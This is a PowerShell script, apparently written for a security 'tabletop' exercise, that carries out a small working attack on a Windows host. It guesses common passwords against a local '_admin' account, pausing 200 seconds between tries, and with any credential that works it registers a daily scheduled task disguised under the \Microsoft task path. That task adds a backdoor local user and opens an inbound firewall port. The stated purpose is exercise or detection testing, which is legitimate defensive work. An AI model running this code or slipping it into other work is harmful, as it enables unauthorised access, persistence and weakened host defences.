# Define the PowerShell script block
$scriptBlock = {
#$STscriptBlock = " Start-Process cmd.exe -ArgumentList '/c net user testcmd 55552! /add'"
# Define the action for the scheduled task with the embedded script block
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument '/c net user tabletop 55552! /add && netsh advfirewall firewall add rule name="tabletoptest" dir=in action=allow protocol=TCP localport=7968 remoteip=192.0.0.1
 && ping 8.8.8.8 '

# Define the trigger for the scheduled task (e.g., run daily at 3:00 PM)
$trigger = New-ScheduledTaskTrigger -Daily -At 3:00PM

# Create the scheduled task
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings (New-ScheduledTaskSettingsSet)
# Register the task with the Task Scheduler
Register-ScheduledTask -TaskName "TableTopScheduledTask" -InputObject $task -TaskPath \Microsoft
}


$commonPasswords = @(
    'password',
     'testklp',
    '123456',
    'qwerty',
    'admin',
    'letmein',
    'testpasswordfortabletop'
)
$user = Get-LocalUser | Where-Object{$_.Name -like "*_admin*"} | select Name
$username = $user[0].Name
$count = 0
#while ($count -lt 15){
foreach($password in $CommonPasswords){
$passwordToTry = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $passwordtotry)
try {
Start-Process powershell.exe -Credential $credential  -ArgumentList $scriptBlock   #$scriptBlock 
}
catch {write-host "incorrect"}
Start-Sleep -Seconds 200

}
